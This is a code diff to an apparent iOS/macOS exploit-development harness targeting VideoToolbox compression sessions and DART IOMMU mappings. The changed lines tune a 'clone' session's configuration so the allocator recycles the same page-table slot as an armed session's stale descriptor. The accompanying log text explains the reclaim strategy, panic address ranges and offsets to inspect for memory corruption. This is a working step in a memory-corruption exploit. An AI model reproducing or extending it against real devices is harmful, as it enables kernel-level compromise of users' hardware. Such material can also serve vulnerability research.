@@ -4730,13 +4730,14 @@ static void runExp3_ModeA(void) {
     // ---- PHASE 4: CLONE ----
     LOG(@"");
     LOG(@"═══ PHASE 4: CLONE (Identity re-claim) ═══");
-    LOG(@"Creating clone session with identical config (Alpha=0).");
+    LOG(@"Creating clone session with IDENTITY-MATCHED config (Alpha=255).");
     LOG(@"Its CONFIGURE drives DARTMapInternalSurfaces through the");
-    LOG(@"same bump allocator → coded-output lands on recycled DVA.");
+    LOG(@"same bump allocator with same InfoSet → coded-output lands on");
+    LOG(@"the SAME PTE slot as the armed session's stale descriptor.");
 
     exp3FreeSamples();
     VTCompressionSessionRef cloneSession = exp3CreateSession(
-        (void *)exp3CollectCallback, NO);
+        (void *)exp3CollectCallback, YES);
     if (!cloneSession) {
         FAIL(@"Clone session creation failed");
         INFO(@"If device panics shortly, F≈U confirmed — stale descriptor");
@@ -4747,13 +4748,13 @@ static void runExp3_ModeA(void) {
     PASS(@"Clone session created — internal surfaces re-mapped");
     LOG(@"If the bump allocator recycled the armed DVA, the clone's");
     LOG(@"coded-output buffer now sits at the stale descriptor's target.");
-    LOG(@"*** CONFIG IDENTITY NOTE: baseline Alpha=0, arm Alpha=255 ***");
-    LOG(@"If Alpha=255 changes InfoSet composition (alpha layers add surfaces),");
-    LOG(@"clone's coded buffer may land at a DIFFERENT DVA than the armed one.");
-    LOG(@"Check panic .ips DVA against known PTE range 0x1c4-0x20b (8 panics).");
-    LOG(@"In-band DVA → reclaim placement failed (clone landed on DIFFERENT slot).");
-    LOG(@"Out-band DVA → fire hit before/during clone mapping.");
-    LOG(@"Backup: raw-IOKit CONFIGURE (sel 4) for tighter window control.");
+    LOG(@"*** MODE A2: Identity-matched clone (Alpha=255 both sides) ***");
+    LOG(@"A1 showed PTE 0x3cc — outside 0x1c4-0x20b range. Alpha=0 clone");
+    LOG(@"got different InfoSet → different PTE slots. Now matching Alpha=255");
+    LOG(@"so bump allocator recycles the SAME slot. Clone may also -17691;");
+    LOG(@"that's expected — we need the MAPPING, not the encode output.");
+    LOG(@"If no panic past 200s → stale write landed in clone's buffer.");
+    LOG(@"Hunt +0xa8/+0xac/+0x1270 for corruption fingerprint.");
 
     CVPixelBufferRef clonePB = exp3CreatePixelBuffer(0x80, 0x80);
     if (!clonePB) {
